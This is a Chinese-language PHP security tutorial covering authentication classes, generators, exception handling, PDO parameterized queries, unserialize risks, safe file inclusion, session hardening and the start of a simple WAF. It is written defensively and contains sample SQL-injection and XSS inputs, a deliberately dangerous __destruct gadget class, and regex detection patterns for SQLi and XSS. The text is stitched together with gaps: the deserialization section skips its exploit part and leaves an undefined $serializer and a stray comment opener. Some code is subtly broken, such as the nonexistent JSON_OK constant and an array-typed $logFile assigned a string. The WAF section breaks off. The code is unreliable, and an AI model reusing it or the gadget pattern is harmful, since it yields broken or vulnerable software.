### 1.1 面向对象进阶（接口、抽象类、Trait、命名空间）

```php
<?php
// ===== PHP 面向对象进阶 =====

// ---------- 命名空间 ----------
namespace App\Security;

// 使用 use 导入其他命名空间的类
use App\Database\Connection;
use App\Exceptions\SecurityException;

// ---------- 接口（Interface） ----------
// 接口定义契约，实现类必须实现所有方法
interface AuthenticatorInterface {
    /**
     * 用户认证
     * @param string $username 用户名
     * @param string $password 密码
     * @return bool 认证是否成功
     */
    public function authenticate(string $username, string $password): bool;

    /**
     * 检查是否已认证
     * @return bool
     */
    public function check(): bool;

    /**
     * 登出
     * @return void
     */
    public function logout(): void;
}

// ---------- 抽象类（Abstract Class） ----------
// 抽象类可以包含具体实现和抽象方法
abstract class AbstractAuthenticator implements AuthenticatorInterface {
    protected array $config;
    protected ?array $user = null;

    // 构造函数：子类必须调用
    public function __construct(array $config = []) {
        $this->config = array_merge($this->getDefaultConfig(), $config);
    }

    // 抽象方法：子类必须实现
    abstract protected function findUser(string $username): ?array;

    // 具体方法：子类可以直接使用或重写
    public function check(): bool {
        return $this->user !== null;
    }

    // 模板方法模式：定义算法骨架
    public function authenticate(string $username, string $password): bool {
        // 1. 查找用户
        $user = $this->findUser($username);
        if ($user === null) {
            return false;
        }

        // 2. 验证密码（使用 password_verify 防计时攻击）
        if (!password_verify($password, $user['password_hash'])) {
            return false;
        }

        // 3. 检查密码是否需要重新哈希
        if (password_needs_rehash($user['password_hash'], PASSWORD_BCRYPT)) {
            $user['password_hash'] = password_hash($password, PASSWORD_BCRYPT);
            $this->updatePasswordHash($user);
        }

        // 4. 认证成功
        $this->user = $user;
        $this->onAuthenticated($user);
        return true;
    }

    // 钩子方法：子类可选择性重写
    protected function onAuthenticated(array $user): void {
        // 默认空实现，子类可添加日志记录等逻辑
    }

    abstract protected function updatePasswordHash(array $user): void;

    // 提供默认配置
    protected function getDefaultConfig(): array {
        return [
            'max_attempts' => 5,
            'lockout_time' => 1800, // 30 分钟
        ];
    }
}

// ---------- Trait ----------
// Trait 解决 PHP 单继承的限制，实现代码复用
trait RateLimitTrait {
    private array $attempts = [];

    /**
     * 记录尝试次数
     */
    protected function recordAttempt(string $identifier): void {
        if (!isset($this->attempts[$identifier])) {
            $this->attempts[$identifier] = ['count' => 0, 'first' => time()];
        }
        $this->attempts[$identifier]['count']++;
    }

    /**
     * 检查是否超过限制
     */
    protected function isRateLimited(string $identifier, int $maxAttempts): bool {
        if (!isset($this->attempts[$identifier])) {
            return false;
        }

        $attempt = $this->attempts[$identifier];
        $elapsed = time() - $attempt['first'];

        // 窗口期内超过最大尝试次数
        if ($elapsed < $this->config['lockout_time'] && $attempt['count'] >= $maxAttempts) {
            return true;
        }

        // 窗口过期，重置
        if ($elapsed >= $this->config['lockout_time']) {
            unset($this->attempts[$identifier]);
        }

        return false;
    }
}

trait AuditLogTrait {
    /**
     * 记录审计日志
     */
    protected function logAudit(string $action, array $context = []): void {
        $entry = sprintf(
            '[%s] %s | IP: %s | User-Agent: %s | Data: %s',
            date('Y-m-d H:i:s'),
            $action,
            $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
            json_encode($context, JSON_UNESCAPED_UNICODE)
        );
        error_log($entry);
    }
}

// ---------- 具体实现类 ----------
class DatabaseAuthenticator extends AbstractAuthenticator {
    use RateLimitTrait;
    use AuditLogTrait;

    private \PDO $db;

    public function __construct(\PDO $db, array $config = []) {
        parent::__construct($config);
        $this->db = $db;
    }

    // 实现抽象方法：从数据库查找用户
    protected function findUser(string $username): ?array {
        // 使用参数化查询防止 SQL 注入
        $stmt = $this->db->prepare(
            'SELECT id, username, password_hash, role FROM users WHERE username = :username LIMIT 1'
        );
        $stmt->execute([':username' => $username]);
        $user = $stmt->fetch(\PDO::FETCH_ASSOC);
        return $user ?: null;
    }

    // 认证时增加速率限制
    public function authenticate(string $username, string $password): bool {
        // 速率限制检查
        if ($this->isRateLimited($username, $this->config['max_attempts'])) {
            $this->logAudit('RATE_LIMITED', ['username' => $username]);
            throw new SecurityException('尝试次数过多，请稍后再试');
        }

        $this->recordAttempt($username);
        $result = parent::authenticate($username, $password);

        $this->logAudit($result ? 'LOGIN_SUCCESS' : 'LOGIN_FAILED', [
            'username' => $username,
        ]);

        return $result;
    }

    protected function updatePasswordHash(array $user): void {
        $stmt = $this->db->prepare(
            'UPDATE users SET password_hash = :hash WHERE id = :id'
        );
        $stmt->execute([
            ':hash' => $user['password_hash'],
            ':id' => $user['id'],
        ]);
    }

    public function logout(): void {
        $this->user = null;
        $this->logAudit('LOGOUT');
    }
}

// ---------- 枚举（PHP 8.1+） ----------
enum UserRole: string {
    case Admin = 'admin';
    case Editor = 'editor';
    case Reader = 'reader';

    // 枚举方法
    public function canDelete(): bool {
        return match($this) {
            self::Admin => true,
            self::Editor, self::Reader => false,
        };
    }

    public function label(): string {
        return match($this) {
            self::Admin => '管理员',
            self::Editor => '编辑者',
            self::Reader => '读者',
        };
    }
}

// 使用枚举
$role = UserRole::Admin;
echo $role->label();      // 管理员
echo $role->canDelete();  // true
```

### 1.2 匿名函数与箭头函数

```php
<?php
// ===== 匙名函数（闭包）与箭头函数 =====

// ---------- 匿名函数 ----------
// 使用 use 从父作用域继承变量
$securityLevel = 'high';

$checkInput = function(string $input) use ($securityLevel) {
    // $securityLevel 被值捕获（修改不影响原变量）
    if ($securityLevel === 'high') {
        // 高安全级别：严格过滤
        $input = htmlspecialchars(strip_tags($input), ENT_QUOTES, 'UTF-8');
    } else {
        // 低安全级别：基本过滤
        $input = strip_tags($input);
    }
    return $input;
};

echo $checkInput('<script>alert(1)</script>');  // 输出: alert(1)

// 引用捕获（修改会影响原变量）
$counter = 0;
$increment = function() use (&$counter) {
    $counter++;
};
$increment();
$increment();
echo $counter;  // 2

// ---------- 回调函数 ----------

// array_map 使用匿名函数
$inputs = ['<script>', "'; DROP TABLE--", '<b>bold</b>'];
$sanitized = array_map(function($input) {
    return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}, $inputs);

// array_filter 使用匿名函数
$ports = [22, 80, 443, 8080, 3306, 0, -1];
$validPorts = array_filter($ports, function($port) {
    return $port > 0 && $port <= 65535;
});

// usort 自定义排序
$users = [
    ['name' => '张三', 'role' => 'admin', 'loginCount' => 100],
    ['name' => '李四', 'role' => 'user', 'loginCount' => 50],
    ['name' => '王五', 'role' => 'editor', 'loginCount' => 75],
];

// 按登录次数降序排列
usort($users, function($a, $b) {
    return $b['loginCount'] - $a['loginCount'];
});

// ---------- 箭头函数（PHP 7.4+） ----------
// 箭头函数自动捕获父作用域变量（按值）
// 语法更简洁，但只能包含单行表达式

$allowedTags = ['<b>', '<i>', '<strong>'];

// 匿名函数写法
$filterFn = function($tag) use ($allowedTags) {
    return !in_array($tag, $allowedTags);
};

// 箭头函数等价写法（更简洁）
$filterFn = fn($tag) => !in_array($tag, $allowedTags);

$allTags = ['<script>', '<b>', '<iframe>', '<i>'];
$blocked = array_filter($allTags, fn($tag) => !in_array($tag, $allowedTags));
print_r($blocked);  // ['<script>', '<iframe>']

// 箭头函数嵌套
$multiplier = fn($x) => fn($y) => $x * $y;
$times3 = $multiplier(3);
echo $times3(4);  // 12

// 实际应用：安全检查管道
$input = '<script>alert("xss")</script>';
$processors = [
    fn($s) => strip_tags($s),                                    // 移除 HTML 标签
    fn($s) => htmlspecialchars($s, ENT_QUOTES, 'UTF-8'),        // HTML 转义
    fn($s) => trim($s),                                           // 去除空白
    fn($s) => preg_replace('/[\x00-\x1F\x7F]/u', '', $s),       // 移除控制字符
];

$result = $input;
foreach ($processors as $processor) {
    $result = $processor($result);
}
echo $result;  // alert("xss")
```

### 1.3 Generator 生成器

```php
<?php
// ===== Generator 生成器 =====
// 生成器用于遍历大量数据时节省内存
// 每次只产生一个值，不需要将所有数据加载到内存

// ---------- 基本生成器 ----------
function readLargeFile(string $filename): \Generator {
    $handle = fopen($filename, 'r');
    if ($handle === false) {
        throw new \RuntimeException("无法打开文件: $filename");
    }

    try {
        while (($line = fgets($handle)) !== false) {
            // yield 产生一个值，暂停执行，等待下次调用
            yield trim($line);
        }
    } finally {
        fclose($handle);
    }
}

// 使用：逐行读取大文件，内存占用恒定
foreach (readLargeFile('/var/log/auth.log') as $lineNumber => $line) {
    if (preg_match('/Failed password/', $line)) {
        echo "登录失败: $line\n";
    }
}

// ---------- 带键值对的生成器 ----------
function parseAccessLogs(string $filename): \Generator {
    foreach (readLargeFile($filename) as $line) {
        // 解析 Nginx/Apache 日志格式
        // 192.168.1.1 - - [10/Sep/2026:13:55:36] "GET /admin HTTP/1.1" 403
        if (preg_match(
            '/^(\S+) \S+ \S+ \[([^\]]+)\] "(\S+) (\S+) \S+" (\d+)/',
            $line,
            $matches
        )) {
            yield $matches[1] => [  // yield 键 => 值
                'ip' => $matches[1],
                'time' => $matches[2],
                'method' => $matches[3],
                'path' => $matches[4],
                'status' => $matches[5],
            ];
        }
    }
}

// 统计每个 IP 的请求次数（流式处理）
$ipCounts = [];
foreach (parseAccessLogs('/var/log/nginx/access.log') as $ip => $entry) {
    if (!isset($ipCounts[$ip])) {
        $ipCounts[$ip] = 0;
    }
    $ipCounts[$ip]++;

    // 检测异常：单 IP 高频访问
    if ($ipCounts[$ip] > 1000) {
        echo "[告警] IP $ip 访问次数超过 1000\n";
    }
}

// ---------- 生成器发送数据 ----------
function portScanner(): \Generator {
    $port = 1;
    while (true) {
        // receive 接收外部传入的端口号
        $command = yield $port;
        if ($command === 'next') {
            $port++;
        } elseif ($command === 'reset') {
            $port = 1;
        } elseif (is_int($command)) {
            $port = $command;
        } elseif ($command === 'stop') {
            return;
        }
        if ($port > 65535) {
            return;
        }
    }
}

$scanner = portScanner();
$scanner->current();  // 1
$scanner->send('next');  // 推进到 2
$scanner->send(443);     // 跳到 443
echo $scanner->current();  // 443

// ---------- yield from 委托生成器 ----------
function scanTcpPorts(): \Generator {
    $commonPorts = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080];
    foreach ($commonPorts as $port) {
        yield $port;
    }
}

function scanUdpPorts(): \Generator {
    $udpPorts = [53, 67, 68, 69, 123, 161];
    foreach ($udpPorts as $port) {
        yield $port;
    }
}

// yield from 委托给子生成器
function scanAllPorts(): \Generator {
    yield from scanTcpPorts();
    yield from scanUdpPorts();
}

foreach (scanAllPorts() as $port) {
    echo "扫描端口: $port\n";
}
```

### 1.4 异常处理进阶

```php
<?php
// ===== PHP 异常处理进阶 =====

// ---------- 自定义异常层级 ----------

// 基础安全异常
class SecurityException extends \Exception {
    public function __construct(
        string $message,
        int $code = 0,
        ?\Throwable $previous = null,
        public readonly ?string $userMessage = null
    ) {
        parent::__construct($message, $code, $previous);
    }
}

// 认证异常
class AuthenticationException extends SecurityException {}
class InvalidCredentialsException extends AuthenticationException {}
class AccountLockedException extends AuthenticationException {}

// 授权异常
class AuthorizationException extends SecurityException {}
class InsufficientPrivilegeException extends AuthorizationException {}

// 输入验证异常
class ValidationException extends SecurityException {
    private array $errors;

    public function __construct(array $errors, string $message = '输入验证失败') {
        $this->errors = $errors;
        parent::__construct($message);
    }

    public function getErrors(): array {
        return $this->errors;
    }
}

// 速率限制异常
class RateLimitException extends SecurityException {
    public function __construct(public readonly int $retryAfter) {
        parent::__construct("请求过于频繁，请在 {$retryAfter} 秒后重试");
    }
}

// ---------- 异常处理示例 ----------

class SecurityMiddleware {
    private array $config;

    public function __construct(array $config = []) {
        $this->config = $config;
    }

    /**
     * 处理请求
     */
    public function handle(callable $handler): void {
        try {
            // 设置全局异常处理器
            set_exception_handler([$this, 'globalExceptionHandler']);
            set_error_handler([$this, 'errorToExceptionHandler']);

            $handler();

        } catch (InvalidCredentialsException $e) {
            http_response_code(401);
            echo json_encode(['error' => '用户名或密码错误']);

        } catch (AccountLockedException $e) {
            http_response_code(423);  // Locked
            echo json_encode(['error' => $e->getMessage()]);

        } catch (InsufficientPrivilegeException $e) {
            http_response_code(403);
            echo json_encode(['error' => '权限不足']);

        } catch (ValidationException $e) {
            http_response_code(422);
            echo json_encode([
                'error' => $e->getMessage(),
                'details' => $e->getErrors(),
            ]);

        } catch (RateLimitException $e) {
            http_response_code(429);  // Too Many Requests
            header("Retry-After: {$e->retryAfter}");
            echo json_encode(['error' => $e->getMessage()]);

        } catch (SecurityException $e) {
            // 其他安全异常
            http_response_code(400);
            // 不向用户暴露内部错误细节
            echo json_encode([
                'error' => $e->userMessage ?? '请求处理失败',
            ]);
            // 记录详细错误到日志
            error_log("SecurityException: " . $e->getMessage() . "\n" . $e->getTraceAsString());

        } catch (\Throwable $e) {
            // 兜底：未知异常
            http_response_code(500);
            // 生产环境绝不返回堆栈信息
            echo json_encode(['error' => '服务器内部错误']);
            // 记录完整错误到安全日志
            error_log("Unhandled exception: " . $e->getMessage() . "\n" . $e->getTraceAsString());
        }
    }

    /**
     * 全局异常处理器
     */
    public function globalExceptionHandler(\Throwable $e): void {
        // 记录错误日志（不暴露给用户）
        error_log(sprintf(
            "[%s] %s: %s in %s:%d\nStack trace:\n%s",
            date('Y-m-d H:i:s'),
            get_class($e),
            $e->getMessage(),
            $e->getFile(),
            $e->getLine(),
            $e->getTraceAsString()
        ));

        // 返回安全的错误信息
        if (!headers_sent()) {
            http_response_code(500);
            header('Content-Type: application/json');
        }

        // 开发环境返回详细信息，生产环境返回通用错误
        $isDev = ($this->config['env'] ?? 'production') === 'development';
        echo json_encode([
            'error' => $isDev ? $e->getMessage() : '服务器内部错误',
            ...$isDev ? [
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString(),
            ] : [],
        ], JSON_PRETTY_PRINT);
    }

    /**
     * 将 PHP 错误转换为异常
     */
    public function errorToExceptionHandler(int $errno, string $errstr, string $errfile, int $errline): bool {
        // 只处理符合 error_reporting 设定的错误
        if (!(error_reporting() & $errno)) {
            return false;
        }

        throw new \ErrorException($errstr, 0, $errno, $errfile, $errline);
    }
}

// ---------- finally 块 ----------

function secureFileOperation(string $filename): string {
    $handle = fopen($filename, 'r');
    if ($handle === false) {
        throw new \RuntimeException("无法打开文件: $filename");
    }

    try {
        $content = fread($handle, filesize($filename));
        if ($content === false) {
            throw new \RuntimeException("读取文件失败");
        }
        return $content;
    } catch (\Throwable $e) {
        // 记录错误
        error_log("文件操作失败: " . $e->getMessage());
        throw $e;  // 重新抛出
    } finally {
        // 无论成功失败，确保关闭文件句柄
        fclose($handle);
        echo "文件句柄已关闭\n";
    }
}
```

```php
<?php
// ===== 使用 PDO 防止 SQL 注入的完整实现 =====

class SecureDatabase {
    private \PDO $pdo;

    public function __construct(array $config) {
        $dsn = sprintf(
            'mysql:host=%s;port=%d;dbname=%s;charset=utf8mb4',
            $config['host'],
            $config['port'] ?? 3306,
            $config['dbname']
        );

        // PDO 安全配置
        $this->pdo = new \PDO($dsn, $config['username'], $config['password'], [
            \PDO::ATTR_ERRMODE => \PDO::ERRMODE_EXCEPTION,        // 异常模式
            \PDO::ATTR_DEFAULT_FETCH_MODE => \PDO::FETCH_ASSOC,   // 关联数组
            \PDO::ATTR_EMULATE_PREPARES => false,                 // 关闭模拟预处理（真正的参数化查询）
            \PDO::MYSQL_ATTR_MULTI_STATEMENTS => false,           // 禁止多语句（防堆叠注入）
        ]);

        // 设置 SQL 模式（严格模式）
        $this->pdo->exec("SET sql_mode = 'STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO'");
    }

    // ===== 参数化查询：防 SQL 注入的核心 =====

    /**
     * 命名参数方式（推荐，更清晰）
     */
    public function findUserByEmail(string $email): ?array {
        // SQL 语句中使用 :email 占位符
        $sql = 'SELECT id, username, email, role FROM users WHERE email = :email LIMIT 1';

        $stmt = $this->pdo->prepare($sql);              // 预处理
        $stmt->bindValue(':email', $email, \PDO::PARAM_STR);  // 绑定参数
        $stmt->execute();

        $user = $stmt->fetch();
        return $user ?: null;
    }

    /**
     * 问号参数方式
     */
    public function findUserById(int $id): ?array {
        $sql = 'SELECT id, username, email, role FROM users WHERE id = ? LIMIT 1';

        $stmt = $this->pdo->prepare($sql);
        $stmt->bindValue(1, $id, \PDO::PARAM_INT);  // 指定类型为整数
        $stmt->execute();

        return $stmt->fetch() ?: null;
    }

    /**
     * 动态 IN 查询（安全处理数组参数）
     */
    public function findUsersByIds(array $ids): array {
        // 过滤非整数值
        $ids = array_filter($ids, 'is_numeric');
        if (empty($ids)) {
            return [];
        }

        // 为每个 ID 生成占位符
        $placeholders = implode(',', array_fill(0, count($ids), '?'));
        $sql = "SELECT id, username FROM users WHERE id IN ($placeholders) ORDER BY id";

        $stmt = $this->pdo->prepare($sql);

        // 逐个绑定参数（从 1 开始）
        foreach ($ids as $index => $id) {
            $stmt->bindValue($index + 1, (int)$id, \PDO::PARAM_INT);
        }

        $stmt->execute();
        return $stmt->fetchAll();
    }

    /**
     * 安全的动态查询构建（白名单控制字段名）
     */
    public function searchUsers(array $filters, string $sortBy = 'id', string $sortDir = 'ASC'): array {
        // 字段名白名单（列名不能用参数化，必须白名单）
        $allowedColumns = ['id', 'username', 'email', 'created_at', 'role'];
        $allowedDirections = ['ASC', 'DESC'];

        // 验证排序字段（防通过字段名注入）
        if (!in_array($sortBy, $allowedColumns)) {
            $sortBy = 'id';  // 回退到默认
        }
        if (!in_array(strtoupper($sortDir), $allowedDirections)) {
            $sortDir = 'ASC';
        }

        // 构建 WHERE 条件
        $conditions = [];
        $params = [];

        if (!empty($filters['username'])) {
            // LIKE 查询：将通配符作为值的一部分传入参数
            $conditions[] = 'username LIKE :username';
            $params[':username'] = '%' . $filters['username'] . '%';
        }

        if (!empty($filters['role'])) {
            $allowedRoles = ['admin', 'editor', 'reader'];
            if (in_array($filters['role'], $allowedRoles)) {
                $conditions[] = 'role = :role';
                $params[':role'] = $filters['role'];
            }
        }

        if (!empty($filters['created_after'])) {
            $conditions[] = 'created_at >= :created_after';
            $params[':created_after'] = $filters['created_after'];
        }

        $where = $conditions ? 'WHERE ' . implode(' AND ', $conditions) : '';
        $sql = "SELECT id, username, email, role, created_at FROM users $where ORDER BY $sortBy $sortDir LIMIT 100";

        $stmt = $this->pdo->prepare($sql);
        foreach ($params as $param => $value) {
            $stmt->bindValue($param, $value);
        }
        $stmt->execute();

        return $stmt->fetchAll();
    }

    /**
     * 安全插入
     */
    public function createUser(array $data): int {
        // 只允许指定字段（防字段注入）
        $allowedFields = ['username', 'email', 'password_hash', 'role'];
        $filtered = array_intersect_key($data, array_flip($allowedFields));

        if (count($filtered) !== count($allowedFields)) {
            throw new \InvalidArgumentException('缺少必填字段');
        }

        $columns = implode(',', array_keys($filtered));
        $placeholders = implode(',', array_map(fn($k) => ":$k", array_keys($filtered)));

        $sql = "INSERT INTO users ($columns) VALUES ($placeholders)";
        $stmt = $this->pdo->prepare($sql);

        foreach ($filtered as $field => $value) {
            $stmt->bindValue(":$field", $value);
        }

        $stmt->execute();
        return (int)$this->pdo->lastInsertId();
    }

    /**
     * 安全批量更新
     */
    public function updateUser(int $id, array $data): bool {
        $allowedFields = ['username', 'email', 'role', 'password_hash'];
        $filtered = array_intersect_key($data, array_flip($allowedFields));

        if (empty($filtered)) {
            return false;
        }

        // 动态构建 SET 子句
        $setClauses = array_map(fn($field) => "$field = :$field", array_keys($filtered));
        $sql = "UPDATE users SET " . implode(', ', $setClauses) . " WHERE id = :id";

        $stmt = $this->pdo->prepare($sql);
        $stmt->bindValue(':id', $id, \PDO::PARAM_INT);

        foreach ($filtered as $field => $value) {
            $stmt->bindValue(":$field", $value);
        }

        return $stmt->execute();
    }

    /**
     * 事务处理
     */
    public function transferCredits(int $fromId, int $toId, int $amount): void {
        $this->pdo->beginTransaction();

        try {
            // 检查余额（使用行锁 FOR UPDATE）
            $stmt = $this->pdo->prepare(
                'SELECT credits FROM accounts WHERE user_id = ? FOR UPDATE'
            );
            $stmt->bindValue(1, $fromId, \PDO::PARAM_INT);
            $stmt->execute();
            $account = $stmt->fetch();

            if (!$account || $account['credits'] < $amount) {
                throw new \RuntimeException('余额不足');
            }

            // 扣款
            $this->pdo->prepare('UPDATE accounts SET credits = credits - ? WHERE user_id = ?')
                ->execute([$amount, $fromId]);

            // 加款
            $this->pdo->prepare('UPDATE accounts SET credits = credits + ? WHERE user_id = ?')
                ->execute([$amount, $toId]);

            // 记录转账日志
            $this->pdo->prepare(
                'INSERT INTO transfers (from_user, to_user, amount, created_at) VALUES (?, ?, ?, NOW())'
            )->execute([$fromId, $toId, $amount]);

            $this->pdo->commit();
        } catch (\Throwable $e) {
            $this->pdo->rollBack();
            throw $e;
        }
    }
}
```

```php
// unserialize() 是 PHP 中最危险的函数之一

// ---------- 漏洞原理 ----------

// 定义一个包含魔术方法的类
class Logger {
    public $logfile;
    public $content;

    // __destruct 在对象被销毁时自动调用
    public function __destruct() {
        // 漏洞关键点：魔术方法中执行文件操作
        file_put_contents($this->logfile, $this->content);
        echo "日志已写入: {$this->logfile}\n";
    }
}

// 正常使用

// $handler = new FileHandler();

/**
 * 防护 1：绝不反序列化用户可控的数据
 */
function safeAlternative(string $data) {
    // 使用 JSON 替代 serialize
    $data = json_decode($data, true);
    if (json_last_error() !== JSON_OK) {
        throw new \RuntimeException('数据格式错误');
    }
    // JSON 反序列化不会触发魔术方法，是安全的
    return $data;
}

/**
 * 防护 2：使用 allowed_classes 限制（PHP 7+）
 */
function restrictedUnserialize(string $data) {
    // 只允许反序列化为指定类或禁止所有类
    $obj = unserialize($data, [
        'allowed_classes' => [Logger::class],  // 只允许 Logger 类
        // 'allowed_classes' => false,          // 禁止所有类（全部转为 __PHP_Incomplete_Class）
    ]);

    // 即使允许了 Logger 类，也应验证属性
    if ($obj instanceof Logger) {
        // 白名单验证 logfile 路径
        $allowedPath = '/var/log/app/';
        $realPath = realpath($obj->logfile);
        if ($realPath === false || !str_starts_with($realPath, $allowedPath)) {
            throw new \RuntimeException('非法的日志文件路径');
        }
    }

    return $obj;
}

/**
 * 防护 3：签名验证（HMAC）
 */
class SecureSerializer {
    private string $key;

    public function __construct(string $key) {
        $this->key = $key;
    }

    // 签名后序列化
    public function secureSerialize(mixed $data): string {
        $serialized = serialize($data);
        $signature = hash_hmac('sha256', $serialized, $this->key);
        return base64_encode($signature . '::' . $serialized);
    }

    // 验签后反序列化
    public function secureUnserialize(string $data): mixed {
        $decoded = base64_decode($data, true);
        if ($decoded === false) {
            throw new \RuntimeException('数据解码失败');
        }

        $parts = explode('::', $decoded, 2);
        if (count($parts) !== 2) {
            throw new \RuntimeException('数据格式无效');
        }

        [$signature, $serialized] = $parts;

        // 验证签名（使用 hash_equals 防计时攻击）
        $expectedSignature = hash_hmac('sha256', $serialized, $this->key);
        if (!hash_equals($expectedSignature, $signature)) {
            throw new \RuntimeException('数据签名验证失败，可能被篡改');
        }

        // 签名验证通过后才反序列化
        return unserialize($serialized, ['allowed_classes' => false]);
    }
}

$restored = $serializer->secureUnserialize($safe);

/**
```

```php
function safeInclude_whitelist(string $page): void {

    $allowedPages = [
        'home' => __DIR__ . '/pages/home.php',
        'about' => __DIR__ . '/pages/about.php',
        'contact' => __DIR__ . '/pages/contact.php',
        'login' => __DIR__ . '/pages/login.php',
    ];

    // 检查请求的页面是否在白名单中
    if (!array_key_exists($page, $allowedPages)) {
        // 不在白名单中，返回 404 或显示默认页
        http_response_code(404);
        include $allowedPages['home'];  // 回退到首页
        return;
    }

    // 检查文件是否存在
    if (!file_exists($allowedPages[$page])) {
        throw new \RuntimeException("页面文件不存在");
    }

    include $allowedPages[$page];
}

/**
 * 防护 2：路径验证 + basename
 */
function safeInclude_pathcheck(string $page): void {
    $baseDir = realpath(__DIR__ . '/pages');

    // 使用 basename 移除路径中的目录部分
    $page = basename($page);

    // 只允许 .php 扩展名
    if (!preg_match('/^[a-zA-Z0-9_-]+\.php$/', $page)) {
        throw new \InvalidArgumentException('非法的文件名');
    }

    $fullPath = realpath($baseDir . DIRECTORY_SEPARATOR . $page);

    // 验证解析后的路径在基础目录内
    if ($fullPath === false || !str_starts_with($fullPath, $baseDir . DIRECTORY_SEPARATOR)) {
        throw new \RuntimeException('路径遍历攻击');
    }

    // 二次检查扩展名（防符号链接绕过）
    if (pathinfo($fullPath, PATHINFO_EXTENSION) !== 'php') {
        throw new \RuntimeException('非法的文件类型');
    }

    include $fullPath;
}
```

```php
// ===== Session 安全配置 =====

class SecureSession {
    /**
     * 初始化安全的 Session 配置
     */
    public static function start(): void {
        // ===== php.ini 安全配置 =====

        // 使用严格模式：SID 只接受 Cookie 传递，不接受 URL 传递
        ini_set('session.use_strict_mode', '1');

        // 只使用 Cookie 传递 Session ID（防 URL 泄露）
        ini_set('session.use_only_cookies', '1');

        // 使用 HttpOnly Cookie（防 JavaScript 窃取）
        ini_set('session.cookie_httponly', '1');

        // 仅 HTTPS 传输 Session Cookie
        ini_set('session.cookie_secure', '1');

        // SameSite 属性（防 CSRF）
        ini_set('session.cookie_samesite', 'Strict');

        // 使用更安全的 Session ID 生成方式
        ini_set('session.sid_length', '48');       // 更长的 SID
        ini_set('session.sid_bits_per_character', '6');  // 更多字符集

        // 防止 Session ID 固定攻击
        ini_set('session.use_strict_mode', '1');

        // 设置合理的 Session 过期时间
        ini_set('session.gc_maxlifetime', 1800);   // 30 分钟
        ini_set('session.cookie_lifetime', 0);     // 浏览器关闭即过期

        // Session 文件存储路径（应放在 web 根目录外）
        ini_set('session.save_path', '/var/lib/php/sessions');

        // 启动 Session
        session_start();

        // 验证 Session 合法性（防 Session 固定）
        self::validateSession();
    }

    /**
     * 验证 Session 指纹（防 Session 劫持）
     */
    private static function validateSession(): void {
        // 生成 Session 指纹（基于客户端特征）
        $fingerprint = self::generateFingerprint();

        if (!isset($_SESSION['fingerprint'])) {
            // 首次访问，存储指纹
            $_SESSION['fingerprint'] = $fingerprint;
            $_SESSION['last_activity'] = time();
        } else {
            // 验证指纹是否匹配
            if ($_SESSION['fingerprint'] !== $fingerprint) {
                // 指纹不匹配：可能 Session 被劫持
                self::destroy();
                throw new \RuntimeException('Session 验证失败');
            }

            // 检查空闲超时
            if (time() - $_SESSION['last_activity'] > 1800) {
                self::destroy();
                throw new \RuntimeException('Session 超时');
            }

            $_SESSION['last_activity'] = time();
        }
    }

    /**
     * 生成客户端指纹
     */
    private static function generateFingerprint(): string {
        // 使用多个特征生成指纹（但不包含可变信息如 IP）
        // 注意：IP 可能因代理变化，User-Agent 可能被伪造
        $components = [
            $_SERVER['HTTP_USER_AGENT'] ?? '',
            // 可以添加语言偏好等稳定特征
            $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
            // 客户端 Accept-Encoding
            $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
        ];
        return hash('sha256', implode('|', $components));
    }

    /**
     * 登录成功后重新生成 Session ID（防 Session 固定攻击）
     */
    public static function regenerate(): void {
        // 删除旧的 Session 文件
        session_regenerate_id(true);

        // 重置指纹
        $_SESSION['fingerprint'] = self::generateFingerprint();
        $_SESSION['last_activity'] = time();
        $_SESSION['created_at'] = time();
    }

    /**
     * 安全销毁 Session
     */
    public static function destroy(): void {
        // 清空 Session 变量
        $_SESSION = [];

        // 删除 Session Cookie
        if (ini_get('session.use_cookies')) {
            $params = session_get_cookie_params();
            setcookie(
                session_name(),
                '',
                time() - 42000,
                $params['path'],
                $params['domain'],
                $params['secure'],
                $params['httponly']
            );
        }

        // 销毁 Session
        session_destroy();
    }

    /**
     * 安全写入 Session 数据
     */
    public static function set(string $key, mixed $value): void {
        $_SESSION[$key] = $value;
    }

    /**
     * 安全读取 Session 数据
     */
    public static function get(string $key, mixed $default = null): mixed {
        return $_SESSION[$key] ?? $default;
    }

    /**
     * 定期轮换 Session ID（防长期固定）
     */
    public static function checkRegenerate(int $interval = 300): void {
        $createdAt = $_SESSION['created_at'] ?? time();
        if (time() - $createdAt > $interval) {
            self::regenerate();
        }
    }
}
```

### 2.7 编写一个简易 WAF

```php
<?php
// ===== 编写一个简易 WAF（Web 应用防火墙） =====

class SimpleWAF {
    private array $rules;
    private array $logFile;
    private int $threshold;

    public function __construct() {
        $this->logFile = '/var/log/waf.log';
        $this->threshold = 5;  // 告警阈值
        $this->loadRules();
    }

    /**
     * 加载检测规则
     */
    private function loadRules(): void {
        $this->rules = [
            // ===== SQL 注入规则 =====
            'sqli' => [
                // UNION 注入
                '/\bunion\b.*\bselect\b/i' => 'UNION 注入',
                // 布尔注入
                '/\bor\b\s+\d+\s*=\s*\d+/i' => '布尔注入 (OR 1=1)',
                '/\band\b\s+\d+\s*=\s*\d+/i' => '布尔注入 (AND 1=1)',
                // 注释符
                '/--|\/\*|\*\/|#/i' => 'SQL 注释符',
                // 堆叠注入
                '/;\s*(drop|delete|insert|update|create|alter)\b/i' => '堆叠注入',
                // 常用函数
                '/\b(sleep|benchmark|load_file|into\s+outfile)\b/i' => 'SQL 危险函数',
                // 信息获取
                '/\b(database|version|user|schema|table_name)\s*\(\s*\)/i' => 'SQL 信息获取函数',
                // hex 编码注入
                '/0x[0-9a-f]+/i' => '十六进制编码',
                // 字符串截断
                "/'\s*(or|and|union|select)\b/i" => '字符串截断注入',
            ],

            // ===== XSS 规则 =====
            'xss' => [
                // <script> 标签
                '/<script[^>]*>.*?<\/script>/is' => 'Script 标签',
                // 事件处理器
                '/on\w+\s*=\s*["\'][^"\']*["\']/i' => '事件处理器',
                // javascript: 协议
                '/javascript:/i' => 'javascript 协议',
                // <iframe> 标签
                '/<iframe|<object|<embed|<applet/i' => '危险嵌入标签',
                // <img> onerror
                '/<img[^>]+onerror/i' => 'Img onerror XSS',
                // data: 协议
                '/data:text\/html/i' => 'Data 协议 XSS',
